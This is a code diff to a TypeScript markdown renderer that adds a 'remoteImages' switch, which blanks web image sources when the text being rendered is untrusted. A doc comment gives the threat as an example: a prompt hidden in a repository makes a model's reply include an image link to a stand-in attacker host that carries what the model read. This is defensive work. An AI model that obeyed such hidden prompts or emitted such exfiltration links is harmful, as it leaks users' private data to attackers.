@@ -152,6 +152,19 @@ let imageResolver: ((src: string) => string) | null = null;
  */
 const mintedFileUrls = new Set<string>();
 
+/**
+ * Whether this render may load an image from the web (MarkdownOpts.remoteImages).
+ * Module state for the same reason as the resolver: the markdown pass and the
+ * sanitizer's pass over the finished HTML must both see it.
+ */
+let remoteImagesAllowed = true;
+
+/** "" for a web address when this render must not load one: an `<img src="">`
+ *  requests nothing, and shows its alt text. Everything else passes through. */
+function offline(src: string): string {
+  return !remoteImagesAllowed && /^(?:https?:)?\/\//i.test(src) ? "" : src;
+}
+
 /** Absolute (any scheme), root-relative nothing — the resolver only sees what
  *  is genuinely relative to the document. */
 function isRelativeSrc(url: string): boolean {
@@ -177,12 +190,12 @@ function safeImgSrc(raw: string): string {
       mintedFileUrls.add(resolved);
       return encodeUrl(resolved);
     }
-    return safeUrl(resolved);
+    return offline(safeUrl(resolved));
   }
   // The sanitizer's second pass over the finished HTML lands here with the
   // RESOLVED url — re-admit it only if this very render minted it.
   if (mintedFileUrls.has(url)) return encodeUrl(url);
-  return safeUrl(url);
+  return offline(safeUrl(url));
 }
 
 // ── the sanitizer ────────────────────────────────────────────────────────────
@@ -525,19 +538,30 @@ export interface MarkdownOpts {
   /** Turn a RELATIVE image src into an absolute URL — the surface knows where
    *  the document lives; the renderer does not. See `imageResolver`. */
   resolveImage?: (src: string) => string;
+  /**
+   * `false`: load no image from the web. An http(s) (or protocol-relative)
+   * image renders as its alt text, with an empty src that requests nothing;
+   * data: images and the resolver's local files still show. For text whose
+   * addresses nobody vetted and anyone could steer — a model's reply, which a
+   * prompt hidden in a repository can make write
+   * `![](https://attacker/?q=<what it read>)`. Default true.
+   */
+  remoteImages?: boolean;
 }
 
 export function renderMarkdown(src: string, depth = 0, opts?: MarkdownOpts): string {
-  if (depth === 0 && opts?.resolveImage) {
-    imageResolver = opts.resolveImage;
+  if (depth === 0 && (opts?.resolveImage || opts?.remoteImages === false)) {
+    imageResolver = opts.resolveImage ?? null;
+    remoteImagesAllowed = opts.remoteImages !== false;
     try {
       return renderMarkdownBody(src, 0);
     } finally {
       // Always cleared, error or not — a resolver left behind would quietly
       // re-anchor the NEXT surface's images to this one's repository, and a
       // minted file: URL outliving its render would let a later document
-      // replay it.
+      // replay it. (And a surface that allows web images must get them.)
       imageResolver = null;
+      remoteImagesAllowed = true;
       mintedFileUrls.clear();
     }
   }
